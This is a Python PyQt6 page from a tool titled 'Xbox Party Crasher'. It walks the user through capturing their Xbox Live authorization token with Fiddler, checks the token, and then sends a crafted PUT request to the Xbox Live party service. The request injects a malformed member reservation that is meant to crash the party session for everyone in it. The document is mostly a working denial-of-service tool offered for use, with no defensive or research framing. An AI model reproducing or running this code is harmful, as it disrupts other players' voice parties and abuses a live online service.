import os
import sys
import time
import json
import subprocess
import threading
import webbrowser
from datetime import datetime, timedelta
from pathlib import Path

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QTextEdit, QFrame, QMessageBox, QProgressBar
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject

import certifi
import requests

# ============================================================
# SSL FIX
# ============================================================
cert_path = certifi.where()
os.environ["SSL_CERT_FILE"] = cert_path
os.environ["REQUESTS_CA_BUNDLE"] = cert_path
os.environ["CURL_CA_BUNDLE"] = cert_path


class WorkerSignals(QObject):
    status = pyqtSignal(str, str)
    token_found = pyqtSignal(str)
    finished = pyqtSignal()
    error = pyqtSignal(str)


class VPNPage(QWidget):
    def __init__(self, app_window):
        super().__init__()
        self.app_window = app_window
        self.project_root = Path(__file__).resolve().parents[1]
        self.tools_dir = self.project_root / "tools"
        self.tools_dir.mkdir(exist_ok=True)
        self.token = ""
        self.xuid = ""
        self.gamertag = ""
        self.token_expiry = None
        self.is_capturing = False
        self.signals = WorkerSignals()
        self.signals.status.connect(self.update_status)
        self.signals.token_found.connect(self.on_token_captured)
        self.signals.error.connect(self.on_capture_error)
        self.signals.finished.connect(self.on_capture_finished)
        self.setup_ui()
        self.load_saved_token()
        self.expiry_timer = QTimer(self)
        self.expiry_timer.timeout.connect(self.check_token_expiry)
        self.expiry_timer.start(30_000)

    def load_config(self):
        self.check_token_expiry()

    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(20, 14, 20, 14)
        layout.setSpacing(8)

        header = QHBoxLayout()
        title_box = QVBoxLayout()
        title = QLabel("XBOX PARTY CRASHER")
        title.setObjectName("PageTitle")
        subtitle = QLabel("Capture token -> Crash parties • Token valid 16 hours")
        subtitle.setObjectName("StatusLine")
        title_box.addWidget(title)
        title_box.addWidget(subtitle)
        header.addLayout(title_box)
        header.addStretch()
        layout.addLayout(header)

        main_card = QFrame()
        main_card.setObjectName("VPNHeroPanel")
        card_layout = QVBoxLayout(main_card)
        card_layout.setContentsMargins(16, 14, 16, 14)
        card_layout.setSpacing(10)

        token_label = QLabel("XBL AUTHORIZATION TOKEN")
        token_label.setObjectName("VPNHeroSmall")
        card_layout.addWidget(token_label)

        self.token_entry = QTextEdit()
        self.token_entry.setPlaceholderText("Paste token manually or use capture tools below...")
        self.token_entry.setMinimumHeight(80)
        self.token_entry.setObjectName("VPNConfigText")
        card_layout.addWidget(self.token_entry, 1)

        btn_row = QHBoxLayout()
        btn_row.setSpacing(12)

        self.validate_btn = QPushButton("VALIDATE TOKEN")
        self.validate_btn.setObjectName("VPNTopButtonGreen")
        self.validate_btn.setMinimumHeight(42)
        self.validate_btn.clicked.connect(self.validate)
        btn_row.addWidget(self.validate_btn)

        self.capture_btn = QPushButton("CAPTURE TOKEN AUTOMATICALLY")
        self.capture_btn.setObjectName("VPNTopButton")
        self.capture_btn.setMinimumHeight(42)
        self.capture_btn.clicked.connect(self.start_capture)
        btn_row.addWidget(self.capture_btn)

        self.cancel_btn = QPushButton("STOP CAPTURE")
        self.cancel_btn.setObjectName("DangerButton")
        self.cancel_btn.setMinimumHeight(42)
        self.cancel_btn.setVisible(False)
        self.cancel_btn.clicked.connect(self.cancel_capture)
        btn_row.addWidget(self.cancel_btn)

        card_layout.addLayout(btn_row)

        fiddler_row = QHBoxLayout()
        fiddler_row.setSpacing(12)

        self.download_fiddler_btn = QPushButton("Download Fiddler")
        self.download_fiddler_btn.setObjectName("VPNTopButton")
        self.download_fiddler_btn.setMinimumHeight(38)
        self.download_fiddler_btn.clicked.connect(self.open_fiddler_download)
        fiddler_row.addWidget(self.download_fiddler_btn)

        self.open_fiddler_btn = QPushButton("Open Fiddler (if installed)")
        self.open_fiddler_btn.setObjectName("VPNTopButton")
        self.open_fiddler_btn.setMinimumHeight(38)
        self.open_fiddler_btn.clicked.connect(self.open_fiddler)
        fiddler_row.addWidget(self.open_fiddler_btn)

        card_layout.addLayout(fiddler_row)

        self.auth_status = QLabel("Waiting for token...")
        self.auth_status.setObjectName("VPNMonoText")
        self.auth_status.setWordWrap(True)
        card_layout.addWidget(self.auth_status)

        self.expiry_label = QLabel("")
        self.expiry_label.setObjectName("VPNHeroDetail")
        card_layout.addWidget(self.expiry_label)

        self.info_label = QLabel("Authenticate first")
        self.info_label.setObjectName("VPNHeroDetail")
        card_layout.addWidget(self.info_label)

        self.progress = QProgressBar()
        self.progress.setRange(0, 0)
        self.progress.setVisible(False)
        card_layout.addWidget(self.progress)

        divider = QLabel("─" * 50)
        divider.setObjectName("VPNHeroDetail")
        card_layout.addWidget(divider)

        self.crash_btn = QPushButton("CRASH CURRENT PARTY")
        self.crash_btn.setObjectName("VPNConnectButton")
        self.crash_btn.setMinimumHeight(48)
        self.crash_btn.clicked.connect(self.perform_crash)
        card_layout.addWidget(self.crash_btn)

        self.crash_status = QLabel("")
        self.crash_status.setObjectName("VPNMonoText")
        self.crash_status.setWordWrap(True)
        card_layout.addWidget(self.crash_status)

        layout.addWidget(main_card, 1)

    def open_fiddler_download(self):
        webbrowser.open("https://www.telerik.com/download/fiddler")
        self.update_status("Opened Fiddler download page in your browser", "#55c7ff")

    def open_fiddler(self):
        possible_paths = [
            Path(os.environ.get("ProgramFiles", "")) / "Fiddler" / "Fiddler.exe",
            Path(os.environ.get("ProgramFiles(x86)", "")) / "Fiddler" / "Fiddler.exe",
            Path(os.environ.get("LOCALAPPDATA", "")) / "Programs" / "Fiddler" / "Fiddler.exe",
            Path(os.environ.get("LOCALAPPDATA", "")) / "Fiddler" / "Fiddler.exe",
        ]
        for path in possible_paths:
            if path.exists():
                try:
                    subprocess.Popen([str(path)])
                    self.update_status("Fiddler launched successfully", "#50ff85")
                    return
                except Exception:
                    continue
        try:
            subprocess.Popen("Fiddler.exe")
            self.update_status("Fiddler launched", "#50ff85")
            return
        except Exception:
            pass
        self.update_status("Fiddler not found. Please download it first.", "#ff4d5f")
        QMessageBox.information(
            self,
            "Fiddler Not Found",
            "Fiddler is not installed (or not in the usual location).\n\n"
            "Click 'Download Fiddler' to get it."
        )

    def save_token(self, token: str):
        self.token = token
        self.token_expiry = datetime.now() + timedelta(hours=16)
        data = {
            "token": token,
            "expiry": self.token_expiry.isoformat(),
            "gamertag": self.gamertag,
            "xuid": self.xuid
        }
        try:
            with open(self.tools_dir / "xbox_token.json", "w") as f:
                json.dump(data, f, indent=2)
        except Exception:
            pass

    def load_saved_token(self):
        path = self.tools_dir / "xbox_token.json"
        if not path.exists():
            return
        try:
            with open(path) as f:
                data = json.load(f)
            expiry = datetime.fromisoformat(data["expiry"])
            if datetime.now() < expiry:
                self.token = data["token"]
                self.gamertag = data.get("gamertag", "")
                self.xuid = data.get("xuid", "")
                self.token_expiry = expiry
                self.token_entry.setPlainText(self.token)
                self.auth_status.setText(f"✅ Loaded saved token ({self.gamertag})")
                self.auth_status.setStyleSheet("color: #50ff85;")
                self.info_label.setText(f"Ready - {self.gamertag}")
                self.info_label.setStyleSheet("color: #50ff85;")
                self.update_expiry_label()
            else:
                path.unlink(missing_ok=True)
        except Exception:
            pass

    def check_token_expiry(self):
        if self.token_expiry and datetime.now() >= self.token_expiry:
            self.token = ""
            self.xuid = ""
            self.gamertag = ""
            self.token_expiry = None
            self.token_entry.clear()
            self.auth_status.setText("⏰ Token expired after 16 hours. Please capture a new one.")
            self.auth_status.setStyleSheet("color: #ff4d5f;")
            self.expiry_label.setText("")
            self.info_label.setText("Token expired")
            self.info_label.setStyleSheet("color: #ff4d5f;")
            try:
                (self.tools_dir / "xbox_token.json").unlink(missing_ok=True)
            except Exception:
                pass
        else:
            self.update_expiry_label()

    def update_expiry_label(self):
        if not self.token_expiry:
            self.expiry_label.setText("")
            return
        remaining = self.token_expiry - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        self.expiry_label.setText(f"⏳ Token expires in {hours}h {minutes}m")
        self.expiry_label.setStyleSheet("color: #ffcc33;")

    def update_status(self, message: str, color: str = "#55c7ff"):
        self.auth_status.setText(message)
        self.auth_status.setStyleSheet(f"color: {color};")

    def on_token_captured(self, token: str):
        self.token_entry.setPlainText(token)
        self.update_status("Token captured! Validating...", "#55c7ff")
        self.validate()
        self.on_capture_finished()

    def on_capture_error(self, msg: str):
        self.update_status(f"❌ {msg}", "#ff4d5f")
        self.on_capture_finished()

    def on_capture_finished(self):
        self.is_capturing = False
        self.progress.setVisible(False)
        self.capture_btn.setVisible(True)
        self.capture_btn.setEnabled(True)
        self.capture_btn.setText("CAPTURE TOKEN AUTOMATICALLY")
        self.cancel_btn.setVisible(False)

    def cancel_capture(self):
        if not self.is_capturing:
            return
        self.is_capturing = False
        self.update_status("Capture stopped by user", "#ffcc33")
        self.on_capture_finished()

    def validate(self):
        token_input = self.token_entry.toPlainText().strip()
        if not token_input:
            QMessageBox.warning(self, "Input Required", "Please paste a token first.")
            return
        self.update_status("Validating token...", "#55c7ff")
        self.validate_btn.setEnabled(False)
        success, result = self.validate_token(token_input)
        self.validate_btn.setEnabled(True)
        if success:
            self.token = token_input
            self.gamertag = result["gamertag"]
            self.xuid = result["xuid"]
            self.save_token(token_input)
            self.update_status(f"✅ Authenticated as {self.gamertag}\nXUID: {self.xuid}", "#50ff85")
            self.info_label.setText(f"Ready - {self.gamertag}")
            self.info_label.setStyleSheet("color: #50ff85;")
            self.update_expiry_label()
        else:
            self.update_status(f"❌ {result}", "#ff4d5f")
            self.info_label.setText("Authentication failed")
            self.info_label.setStyleSheet("color: #ff4d5f;")

    def perform_crash(self):
        if not self.token or not self.xuid:
            QMessageBox.warning(self, "Not Authenticated", "Please validate a token first!")
            return
        self.crash_status.setText("Crashing party...")
        self.crash_status.setStyleSheet("color: #ffcc33;")
        self.crash_btn.setEnabled(False)
        success, message = self.crash_party(self.xuid, self.token)
        self.crash_btn.setEnabled(True)
        if success:
            self.crash_status.setText(f"✅ {message}")
            self.crash_status.setStyleSheet("color: #50ff85;")
            QMessageBox.information(self, "Success", message)
        else:
            self.crash_status.setText(f"❌ {message}")
            self.crash_status.setStyleSheet("color: #ff4d5f;")
            QMessageBox.warning(self, "Failed", message)

    def start_capture(self):
        if self.is_capturing:
            return
        reply = QMessageBox.question(
            self,
            "Capture Xbox Token",
            "This will launch the Xbox app.\n\n"
            "Recommended steps:\n"
            "1. Click 'Download Fiddler' if you don't have it\n"
            "2. Open Fiddler and enable HTTPS decryption\n"
            "3. Log in to Xbox app\n"
            "4. Copy the Authorization token from Fiddler\n\n"
            "Continue?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply != QMessageBox.StandardButton.Yes:
            return
        self.is_capturing = True
        self.capture_btn.setVisible(False)
        self.cancel_btn.setVisible(True)
        self.progress.setVisible(True)
        self.update_status("Starting...", "#55c7ff")
        threading.Thread(target=self._capture_thread, daemon=True).start()

    def _capture_thread(self):
        try:
            self.signals.status.emit("Launching Xbox app...", "#55c7ff")
            self._launch_xbox_app()
            self.signals.status.emit(
                "Xbox app launched!\n\n"
                "Now:\n"
                "1. Open Fiddler (use the button above)\n"
                "2. Enable HTTPS decryption\n"
                "3. Log in to Xbox\n"
                "4. Find 'Authorization' header and paste it here",
                "#ffcc33"
            )
            for _ in range(150):
                if not self.is_capturing:
                    break
                time.sleep(2)
            if self.is_capturing:
                self.signals.error.emit("Capture timed out. Paste the token manually.")
            else:
                self.signals.finished.emit()
        except Exception as e:
            self.signals.error.emit(str(e))

    def _launch_xbox_app(self):
        app_id = r"shell:AppsFolder\Microsoft.GamingApp_8wekyb3d8bbwe!Microsoft.Xbox.App"
        try:
            subprocess.Popen(
                ["powershell", "-Command", f'Start-Process "{app_id}"'],
                shell=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return
        except Exception:
            pass
        try:
            os.startfile("xbox:")
            return
        except Exception:
            pass
        self.signals.status.emit("Could not launch Xbox app. Opening Microsoft Store...", "#ffcc33")
        try:
            os.startfile("ms-windows-store://pdp/?ProductId=9MV0B5HZVK9Z")
        except Exception:
            subprocess.Popen(["cmd", "/c", "start", "", "ms-windows-store://pdp/?ProductId=9MV0B5HZVK9Z"], shell=False)

    def validate_token(self, token):
        try:
            url = "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag"
            headers = {
                'Authorization': token,
                'x-xbl-contract-version': '2',
                'Accept': 'application/json',
            }
            response = requests.get(
                url,
                headers=headers,
                timeout=10,
                verify=True
            )
            if not response.text.strip():
                return False, "Token expired or invalid!"
            data = response.json()
            profile = data.get('profileUsers', [{}])[0]
            settings = profile.get('settings', [{}])[0]
            gamertag = settings.get('value')
            xuid = profile.get('hostId')
            if gamertag and xuid:
                return True, {"gamertag": gamertag, "xuid": xuid}
            return False, "Invalid response from Xbox Live"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def crash_party(self, xuid, token):
        try:
            url = f'https://party.xboxlive.com/serviceconfigs/7492baca-c1b4-440d-a391-b7ef364a8d40/sessiontemplates/chat/sessions?xuid={xuid}&followed=true'
            headers = {
                'Authorization': token,
                'X-XBL-Contract-Version': '105',
                'Content-Type': 'application/json',
                'User-Agent': 'PartyChat/1.0',
            }
            resp = requests.get(
                url,
                headers=headers,
                timeout=10,
                verify=True
            )
            data = resp.json()
            if not data.get('results') or not data['results'][0].get('sessionRef', {}).get('name'):
                return False, "You are not in an Xbox party!"
            name = data['results'][0]['sessionRef']['name']
            payload = {
                "members": {
                    "reserve_0": {
                        "constants": {
                            "custom": {"clientCapability": 0},
                            "system": {"xuid": "2535431423282941"}
                        }
                    }
                }
            }
            put_url = f'https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions/{name}'
            requests.put(
                put_url,
                json=payload,
                headers=headers,
                timeout=10,
                verify=True
            )
            return True, "Successfully Crashed Xbox Live Party!"
        except Exception as e:
            return False, f"Failed to crash party: {str(e)}"